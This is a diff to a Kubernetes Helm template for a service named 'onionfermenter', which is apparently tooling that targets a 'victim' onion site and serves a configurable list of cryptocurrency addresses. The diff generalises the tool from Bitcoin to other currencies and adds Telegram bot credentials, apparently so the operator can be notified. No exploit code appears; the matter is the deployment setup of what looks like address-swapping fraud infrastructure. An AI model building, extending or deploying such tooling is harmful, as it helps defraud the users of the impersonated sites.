@@ -19,12 +19,18 @@ spec:
           env:
             - name: VICTIM_ONION_ID
               value: {{ .Values.victimOnionId }}
+            - name: CURRENCY_TYPE
+              value: {{ .Values.currencyType | default "BTC" }}
+            - name: TELEGRAM_BOT_TOKEN
+              value: {{ .Values.telegramBotToken | default "" }}
+            - name: TELEGRAM_CHAT_ID
+              value: {{ .Values.telegramChatId | default "" }}
           volumeMounts:
             - mountPath: /var/lib/tor/hidden_service
               name: hidden-service-volume
             - name: config-volume
-              mountPath: /onionfermenter/BTC-ADDRESSES.txt
-              subPath: BTC-ADDRESSES.txt
+              mountPath: /onionfermenter/{{ .Values.currencyType | default "BTC" }}-ADDRESSES.txt
+              subPath: {{ .Values.currencyType | default "BTC" }}-ADDRESSES.txt
           livenessProbe:
             exec:
               command:
@@ -58,4 +64,4 @@ spec:
             sizeLimit: 10Mi
         - name: config-volume
           configMap:
-            name: btc-addresses
+            name: crypto-addresses
